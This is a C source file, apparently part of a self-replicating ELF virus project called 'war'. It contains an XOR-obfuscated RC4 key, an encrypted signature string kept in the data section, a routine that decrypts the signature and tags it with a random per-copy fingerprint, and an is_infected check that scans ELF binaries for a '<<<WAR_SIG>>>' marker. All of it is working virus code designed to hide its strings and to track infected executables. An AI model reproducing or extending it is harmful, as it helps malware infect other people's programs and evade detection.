#include "../include/war.h"

static const unsigned char OBFUSCATED_KEY[] = {
    0x76, 0x70, 0x66, 0x66, 0x35, 0x23, 0x30, 0x66, 0x66
};
static const size_t KEY_LEN = 9;

static void deobfuscate_key(unsigned char *key_out) {
    for (size_t i = 0; i < KEY_LEN; i++) {
        key_out[i] = OBFUSCATED_KEY[i] ^ 0x42;
    }
}

__attribute__((section(".data")))
unsigned char SIGNATURE_PADDING_START[] = {
    0xDE, 0xAD, 0xBE, 0xEF,
    0xCA, 0xFE, 0xBA, 0xBE,
    0x99, 0xa4, 0x9c, 0x24, 0xb2
};

__attribute__((section(".data")))
unsigned char ENCRYPTED_BASE_SIG[] = {
    0xf2, 0xf9, 0xd2, 0x53, 0x85, 0x3b, 0x7b, 0xb4,
    0xf0, 0xfd, 0x04, 0x83, 0xd2, 0xb0, 0xf6, 0xfe,
    0xe7, 0x34, 0x34, 0x8b, 0x70, 0x71, 0x0d, 0xdf,
    0x2f, 0xd4, 0xde, 0xb5, 0x02, 0xde, 0xf2, 0x40,
    0xe1, 0xe5, 0x23, 0x7f, 0xcc, 0x1a, 0x81, 0xe1,
    0x94, 0x94, 0x03, 0x28, 0xbe, 0x4e, 0x42, 0x4d,
    0x9f, 0x2a, 0x4c, 0xf3, 0x77, 0xfb, 0x77, 0x74,
    0xf4, 0x94, 0x69, 0x15, 0xed, 0x3b, 0x19,
};
__attribute__((section(".data")))
unsigned char SIGNATURE_PADDING[32] = {
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};
static const size_t BASE_SIG_LEN = 63;

static uint32_t generate_new_fingerprint(void) {
    uint32_t seed = 0;
    
    seed ^= (uint32_t)time(NULL);
    seed ^= (uint32_t)getpid();
    seed ^= (uint32_t)(uintptr_t)&seed;
    
    int fd = open("/dev/urandom", O_RDONLY);
    if (fd >= 0) {
        uint32_t random_val;
        read(fd, &random_val, sizeof(random_val));
        seed ^= random_val;
        close(fd);
    }
    
    seed = (seed << 13) | (seed >> 19);
    seed ^= 0xDEADBEEF;
    
    return seed;
}

const char *get_signature(void) {
    static char signature[MAX_SIGNATURE_LEN] = {0};
    static bool decrypted = false;
    
    if (!decrypted) {
        unsigned char rc4_key[KEY_LEN];
        deobfuscate_key(rc4_key);
        
        memcpy(signature, ENCRYPTED_BASE_SIG, BASE_SIG_LEN);
        rc4_crypt((unsigned char *)signature, BASE_SIG_LEN, rc4_key, KEY_LEN);
        
        uint32_t fingerprint = generate_new_fingerprint();
        size_t base_len = strlen(signature);
        
        snprintf(signature + base_len, 
                 MAX_SIGNATURE_LEN - base_len, 
                 "[%016x]", 
                 fingerprint);
        
        decrypted = true;
    }
    return signature;
}

bool is_infected(t_elf *elf) {

    const char base_marker[] = "<<<WAR_SIG>>>";
    size_t marker_len = strlen(base_marker);
    
    for (size_t i = 0; i < elf->size - marker_len; i++) {
        if (memcmp(elf->data + i, base_marker, marker_len) == 0) {
            return true;
        }
    }
    
    return false;
}